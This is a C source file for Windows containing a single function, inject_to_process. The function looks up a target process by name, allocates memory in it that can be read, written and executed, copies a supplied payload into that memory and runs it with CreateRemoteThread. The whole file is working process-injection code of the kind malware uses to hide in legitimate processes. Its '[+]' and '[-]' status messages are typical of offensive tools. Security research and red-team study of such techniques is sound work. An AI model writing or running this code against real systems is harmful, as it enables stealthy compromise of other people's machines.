#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int inject_to_process(const char *target_proc, void *payload, size_t size) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe.szExeFile, target_proc) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &pe));
    CloseHandle(snapshot);

    if (!pid) {
        printf("[-] Process not found: %s\n", target_proc);
        return 0;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("[-] Failed to open target process.\n");
        return 0;
    }

    LPVOID remote = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        printf("[-] Remote allocation failed.\n");
        CloseHandle(hProc);
        return 0;
    }

    WriteProcessMemory(hProc, remote, payload, size, NULL);
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] Remote thread creation failed.\n");
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 0;
    }

    printf("[+] Injected into PID %lu\n", pid);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 1;
}